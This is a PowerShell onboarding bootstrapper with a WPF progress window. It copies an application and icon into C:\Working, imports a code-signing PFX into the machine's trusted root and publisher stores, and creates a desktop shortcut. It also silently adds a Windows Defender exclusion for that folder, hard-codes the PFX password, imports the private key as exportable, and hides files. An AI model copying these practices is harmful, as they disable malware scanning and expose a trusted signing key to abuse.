<#
.SYNOPSIS
  Bootstrapper EXE that deploys the onboarding UI and desktop shortcut.

.DESCRIPTION
  1. Finds its own folder at runtime (no $PSScriptRoot).
  2. Copies WS.Setup.UI.exe and AdvTechLogo.ico into C:\Working.
  3. Copies SignCode_Expires_20260709.pfx into C:\Working and hides it.
  4. Installs the PFX certificate into LocalMachine\Root and LocalMachine\TrustedPublisher.
     - If the certificate already exists, it skips re-importing.
  5. Creates “Onboard” shortcut on the current user’s desktop.
  6. Logs all actions to C:\Working\bootstrap.log.
#>

# Parameters
param(
  [string] $TargetDir = "C:\Working",
  [string] $AppName   = "WS.Setup.UI.exe",
  [string] $IconName  = "AdvTechLogo.ico",
  [string] $PfxName   = "SignCode_Expires_20260709.pfx",
  [string] $PfxPass   = "St@ff1234!",
  [string] $LogFile   = "C:\Working\bootstrap.log"
)

# Logging function
function Write-Log {
  param([string] $Message)
  $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
  "$ts  $Message" | Out-File -FilePath $LogFile -Append -Encoding utf8
}

# Ensure the target directory exists
if (-not (Test-Path $TargetDir)) {
  New-Item -Path $TargetDir -ItemType Directory -Force | Out-Null
  Write-Log "Created target directory: $TargetDir"
}

# -------------------------------------------------------------------
# WPF UI Overlay
# -------------------------------------------------------------------

# Load WPF assemblies
Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase

# 1) Updated XAML with a title bar
$Xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        WindowStyle="None"
        AllowsTransparency="True"
        Background="Transparent"
        Width="400" Height="150"
        Topmost="True"
        ShowInTaskbar="False"
        ResizeMode="NoResize">
  <Border BorderBrush="DodgerBlue" BorderThickness="4" CornerRadius="4" Background="White">
    <DockPanel>
      <!-- Title Bar -->
      <Grid Background="DodgerBlue" Height="28" DockPanel.Dock="Top">
        <Grid.ColumnDefinitions>
          <ColumnDefinition/>
          <ColumnDefinition Width="28"/>
        </Grid.ColumnDefinitions>

        <TextBlock x:Name="TitleLabel"
                   Text="Setting up environment"
                   Foreground="White"
                   FontFamily="Segoe UI Semibold"
                   FontSize="12"
                   VerticalAlignment="Center"
                   Margin="10,0"/>

        <Button x:Name="CloseButton"
                Grid.Column="1"
                Content="✕"
                FontSize="12"
                Background="Transparent"
                BorderThickness="0"
                Foreground="White"
                Cursor="Hand"/>
      </Grid>

      <!-- Main Content -->
      <Grid Margin="8">
        <Grid.RowDefinitions>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="*"/>
          <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>

        <TextBlock x:Name="StepLabel"
                   Text="Starting…"
                   FontFamily="Segoe UI"
                   FontSize="12"
                   HorizontalAlignment="Center"
                   VerticalAlignment="Center"/>

        <ProgressBar x:Name="ProgressBar"
                     Grid.Row="1"
                     Height="20"
                     Minimum="0" Maximum="100"
                     Value="0"
                     Margin="0,10,0,0"/>

        <Button x:Name="DoneButton"
                        Grid.Row="2"
                        Content="Close"
                        Width="80"
                        Height="22"
                        Margin="0,10,0,0"
                        HorizontalAlignment="Center"
                        Visibility="Collapsed"/>
      </Grid>
    </DockPanel>
  </Border>
</Window>
"@

# 2) Parse XAML & grab handles
$reader    = [System.Xml.XmlReader]::Create((New-Object System.IO.StringReader $Xaml))
$window    = [Windows.Markup.XamlReader]::Load($reader)
$stepLabel = $window.FindName("StepLabel")
$progress  = $window.FindName("ProgressBar")
$closeBtn  = $window.FindName("CloseButton")
$doneBtn   = $window.FindName("DoneButton")
$fade      = New-Object Windows.Media.Animation.DoubleAnimation(0,1,[TimeSpan]::FromSeconds(0.5))
$dispatcher= [System.Windows.Threading.Dispatcher]::CurrentDispatcher

# 3) Wire up window dragging and close button
$window.add_MouseLeftButtonDown({
    param($s,$e)
    if ($e.ChangedButton -eq 'Left') { $window.DragMove() }
})

# Close and Done button click handler
$closeBtn.Add_Click({ Close-UI })
$doneBtn.Add_Click({ Close-UI })

# 4) Set up the window to be non-blocking
function Initialize-UI {
  # Center window on primary screen
  $screenW = [System.Windows.SystemParameters]::PrimaryScreenWidth
  $screenH = [System.Windows.SystemParameters]::PrimaryScreenHeight
  $window.Left = ($screenW - $window.Width) / 2
  $window.Top  = ($screenH - $window.Height) / 2

  # Show non-blocking
  $window.Show()
  $dispatcher.Invoke([Action]{}, 'Background')
}

# 5) Update UI elements
function Update-UI {
  param(
    [string] $Text,
    [int]    $Percent
  )
  $stepLabel.Text  = $Text
  $progress.Value  = $Percent
  # Show 'Close' button when done
  if ($Percent -ge 100) {
    $doneBtn.Visibility = 'Visible'
    $doneBtn.BeginAnimation([Windows.UIElement]::OpacityProperty, $fade)
  }
  $dispatcher.Invoke([Action]{}, 'Background')
}

# 6) Close the UI and shutdown the dispatcher
function Close-UI {
  Write-Log "User closed window at $(Get-Date)"
  $window.Close()
  $dispatcher.InvokeShutdown()
}

# -------------------------------------------------------------------
# Main execution
# -------------------------------------------------------------------

# Add exclusion for Windows Defender
$path = 'C:\Working'
$pref = Get-MpPreference

if (-not ($pref.ExclusionPath -contains $path)) {
    Add-MpPreference -ExclusionPath $path
}

# Main bootstrap logic
try {
  Write-Log "=== Bootstrap started ==="
  Initialize-UI

  # 1. Determine source folder
  $exePath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
  $exeDir  = Split-Path -Parent $exePath

  # 2. Copy EXE
  Update-UI -Text "Copying application…" -Percent 20
  Copy-Item (Join-Path $exeDir $AppName) (Join-Path $TargetDir $AppName) -Force
  Write-Log "Copied $AppName"

  # 3. Copy ICO
  Update-UI -Text "Copying icon…" -Percent 40
  $srcIcon  = Join-Path $exeDir $IconName
  $destIcon = Join-Path $TargetDir $IconName
  Copy-Item $srcIcon $destIcon -Force
  Write-Log "Copied $IconName"

  # Hide the icon in the target folder
  $file = Get-Item $destIcon
  $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden
  Write-Log "Set Hidden attribute on copied icon"

  # 4. Copy PFX & hide
  Update-UI -Text "Copying certificate…" -Percent 50
  $srcPfx  = Join-Path $exeDir $PfxName
  $destPfx = Join-Path $TargetDir $PfxName

  if (Test-Path $srcPfx) {
    Copy-Item $srcPfx $destPfx -Force
    Write-Log "Copied PFX to $destPfx"

    $file = Get-Item $destPfx
    $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden
    Write-Log "Set Hidden attribute on copied PFX"
  } else {
    throw "PFX source not found: $srcPfx"
  }

  # 5. Install certificate
  Update-UI -Text "Installing certificate…" -Percent 70
  $securePwd = ConvertTo-SecureString -String $PfxPass -AsPlainText -Force
  $rawCert   = [IO.File]::ReadAllBytes($destPfx)
  $certObj   = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
                  $rawCert, $securePwd, 'MachineKeySet,Exportable,PersistKeySet')
  foreach ($sn in 'Root','TrustedPublisher') {
    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store($sn,'LocalMachine')
    $store.Open('ReadWrite')
    if (-not $store.Certificates.Find('FindByThumbprint',$certObj.Thumbprint,$false).Count) {
      $store.Add($certObj)
      Write-Log "Imported cert to $sn"
    } else {
      Write-Log "Cert already present in $sn"
    }
    $store.Close()
  }

  # 6. Create desktop shortcut
  Update-UI -Text "Creating desktop shortcut…" -Percent 90
  $desktop = [Environment]::GetFolderPath("Desktop")
  $lnkPath = Join-Path $desktop "Onboard.lnk"
  $wsh     = New-Object -ComObject WScript.Shell
  $sc      = $wsh.CreateShortcut($lnkPath)
  $sc.TargetPath   = Join-Path $TargetDir $AppName
  $sc.IconLocation = Join-Path $TargetDir $IconName
  $sc.Save()
  Write-Log "Shortcut created at $lnkPath"

  # 7. Finish
  Update-UI -Text "Done with Bootstrapping!" -Percent 100
}
catch {
  Write-Log "ERROR: $($_.Exception.Message)"
  throw
}
finally {
  Write-Log "=== Bootstrap finished ===`n"
}

# Keep the window alive until Close-UI calls Shutdown()
[System.Windows.Threading.Dispatcher]::Run()
